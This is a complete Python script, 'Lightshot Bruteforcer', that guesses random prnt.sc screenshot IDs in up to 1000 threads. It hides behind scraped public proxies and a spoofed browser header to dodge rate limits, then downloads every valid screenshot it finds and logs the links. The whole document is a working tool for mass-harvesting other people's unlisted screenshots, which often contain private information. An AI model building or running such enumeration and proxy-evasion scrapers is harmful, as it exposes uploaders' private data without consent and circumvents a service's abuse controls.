from configparser import ConfigParser
import threading, requests, random, string, sys, os

from colorama import Fore, init

from time import sleep
import platform

try:
    if platform.system() == 'Windows':
        os.system('cls')
        os.system('title [Lightshot Bruteforcer] by 1YablochniK1 ^| V1.2 ^|')
        os.system('mode CON COLS=55 LINES=30')
    else:
        os.system('clear')
except:
    pass

valid = 0
invalid = 0
retries = 0
proxies = []
proxy_num = 0
lock = threading.Lock()

headers = {'Upgrade-Insecure-Requests':'1', 
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36', 
 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'}
cfg_path = 'config.ini'

def cyan():
    return '\u001b[36;1m'

def red():
    return '\x1b[31;1m'


def green():
    return '\x1b[32;1m'


def reset():
    return '\x1b[0m'


def configC():
    config = ConfigParser()
    config['Lightshot-Bruteforcer'] = {'thread_count':'300', 
     'save-img_path':'Images'}
    with open(cfg_path, 'w') as (f):
        config.write(f)
    configR()


def configR():
    global saveimg_path
    global thc
    try:
        parser = ConfigParser()
        parser.read(cfg_path)
        try:
            thc = int(parser.get('Lightshot-Bruteforcer', 'thread_count'))
            if thc > 1000:
                thc = 1000
            else:
                if thc == 1000:
                    thc = 1000
        except:
            thc = 300

        saveimg_path = parser.get('Lightshot-Bruteforcer', 'save-img_path')
        if not os.path.exists(saveimg_path):
            os.makedirs(saveimg_path)
    except:
        configC()
        configR()


def checkimg(arg):
    if 'image.prntscr' in arg:
        half_url = 'https://image.prntscr.com/image/'
    else:
        if 'i.imgur' in arg:
            half_url = 'https://i.imgur.com/'
    r = os.stat(saveimg_path + '/' + arg.replace(half_url, '')[:6] + '.png').st_size
    if r == 6355:
        try:
            dd = saveimg_path + '/' + arg.replace(half_url, '')[:6] + '.png'
            os.remove(dd)
        except:
            pass

    if r == 503:
        try:
            dd = saveimg_path + '/' + arg.replace(half_url, '')[:6] + '.png'
            os.remove(dd)
        except:
            pass


def grab_proxies():
    while True:
        all_proxies = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=5000&country=all&ssl=all&anonymity=all').text
        for proxy in all_proxies.splitlines():
            proxies.append(proxy)

        sleep(600)
        proxies.clear()


def cpm():
    global invalid
    global valid
    old = valid + invalid
    sleep(1)
    new = valid + invalid
    return (new - old) * 60


def save(arg):
    content = requests.get(arg).content
    if 'image.prntscr' in arg:
        half_url = 'https://image.prntscr.com/image/'
    else:
        if 'i.imgur' in arg:
            half_url = 'https://i.imgur.com/'
    with open(saveimg_path + '/' + arg.replace(half_url, '')[:6] + '.png', 'wb') as (f):
        f.write(content)


def main(proxy):
    global invalid
    global retries
    global valid
    code = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    try:
        check = requests.get(f"https://prnt.sc/{code}", headers=headers, proxies={'https': 'http://%s' % proxy}).text
    except:
        retries += 1
    else:
        if 'name="twitter:image:src" content="' in check and '0_173a7b_211be8ff' not in check and 'ml3U3Pt' not in check:
            lock.acquire()
            sys.stdout.write(f'[{green()}+++{reset()}] https://prnt.sc/{code} [{cyan()}{proxy}{reset()}]\n')
            lock.release()
            valid += 1
            url = check.split('name="twitter:image:src" content="')[1].split('"/> <meta')[0]
            save(url)
            with open('Image Links.txt', 'a', encoding='UTF-8') as (f):
                f.write('https://prnt.sc/%s\n' % code)
            checkimg(url)
        else:
            lock.acquire()
            sys.stdout.write(f'[{red()}---{reset()}] https://prnt.sc/{code} [{cyan()}{proxy}{reset()}]\n')
            lock.release()
            invalid += 1


configR()
threading.Thread(target=grab_proxies).start()
threading.Thread(target=cpm).start()
sleep(3)
while threading.active_count() <= thc:
    try:
        threading.Thread(target=main, args=(proxies[proxy_num],)).start()
        proxy_num += 1
        if proxy_num >= len(proxies):
            proxy_num = 0
    except:
        pass
